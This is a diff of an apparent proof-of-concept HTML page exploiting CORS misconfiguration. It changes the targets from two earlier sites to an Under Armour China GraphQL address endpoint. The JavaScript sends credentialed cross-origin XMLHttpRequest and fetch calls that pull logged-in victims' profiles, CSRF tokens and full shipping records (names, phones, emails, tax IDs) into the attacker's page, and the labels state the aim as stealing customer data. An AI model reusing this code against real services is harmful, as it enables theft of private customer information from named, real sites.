@@ -11,14 +11,14 @@ CORS misconfigure that lead custom's profile be stealed and do any malicous oper
 </br>
 </br>
 <div text="steal customer's personal informaiton ">
-steal customer's personal address and their X-Csrf-Token and authenticity_token value from https://zhixuelong.com
-<textarea id="customerzhixuelong" style="width: 200px; height: 150px;"></textarea>
+steal customer's personal data
+<textarea id="customerpii" style="width: 200px; height: 150px;"></textarea>
 </div>
 </br>
 </br>
 <div text="steal customer's personal informaiton ">
-steal customer's personal address and their X-Csrf-Token and authenticity_token value from https://vchy.com.ua
-<textarea id="customervchy" style="width: 200px; height: 150px;"></textarea>
+steal customer's personal address 
+<textarea id="customeraddress" style="width: 200px; height: 150px;"></textarea>
 </div>
 </br>
 <script>
@@ -28,27 +28,93 @@ steal customer's personal address and their X-Csrf-Token and authenticity_token 
 	{
 		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
 		{
-			document.getElementById("customerzhixuelong").innerHTML = xmlhttp1.responseText;
+			document.getElementById("customerpii").innerHTML = xmlhttp1.responseText;
 			console.log("Success");
 		}
 	}
     	
-	xmlhttp1.open("GET","https://zhixuelong.com/teachers/profile",true);
+	xmlhttp1.open("GET","https://cnbs-api.underarmour.cn/graphql/?opname=queryAddressList",true);
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
 	
-     var xmlhttp2 = new XMLHttpRequest()
-     xmlhttp2.onreadystatechange=function()
-	{
-		if (xmlhttp2.readyState==4 && xmlhttp1.status==200)
-		{
-			document.getElementById("customervchy").innerHTML = xmlhttp2.responseText;
-			console.log("Success");
-		}
-	}
-	xmlhttp2.open("GET","https://vchy.com.ua/home",true);
-	xmlhttp2.withCredentials = true;
-	xmlhttp2.send();
+    // 目标请求地址（需替换为实际接口URL）
+const targetAddress = 'https://cnbs-api.underarmour.cn/graphql/?opname=queryAddressList'; 
+
+// 请求头配置（CORS跨域需明确指定Content-Type）
+const requestOptions = {
+  method: 'POST',
+  mode: 'cors', // 启用CORS模式
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    "operationName": "queryAddressList",
+    "variables": {
+      "memberCode": "",
+      "pageInput": {
+        "pageNum": 1,
+        "pageSize": 100
+      }
+    },
+    "query": `query queryAddressList($memberCode: String!, $pageInput: PageInput) {
+  data: queryMemberShippingAddressUAList(
+    memberCode: $memberCode
+    pageInput: $pageInput
+  ) {
+    dataList: edges {
+      data: node {
+        ...addressInfo
+        __typename
+      }
+      __typename
+    }
+    __typename
+  }
+}
+
+fragment addressInfo on MemberShippingAddress {
+  addressCode
+  stateName
+  cityName
+  districtName
+  address1
+  recipientFirstName
+  recipientLastName
+  recipientMobile
+  defaultAddress
+  recipientEmail
+  recipientMobile
+  stateCode
+  cityCode
+  districtCode
+  zipCode
+  taxId
+  companyName
+  type
+  countryCode
+  __typename
+}`
+  })
+};
+
+// 发送请求并处理响应
+fetch(targetAddress, requestOptions)
+  .then(response => {
+    // 检查HTTP响应状态
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    // 解析JSON响应（根据实际接口返回格式调整）
+    return response.json();
+  })
+  .then(data => {
+    console.log('请求成功，返回数据：', data);
+    document.getElementById("customeraddress").innerHTML = data;
+  })
+  .catch(error => {
+    console.error('请求失败：', error);
+    // 处理错误（如网络问题、CORS限制、服务器错误等）
+  });
 	
 	
 </script>
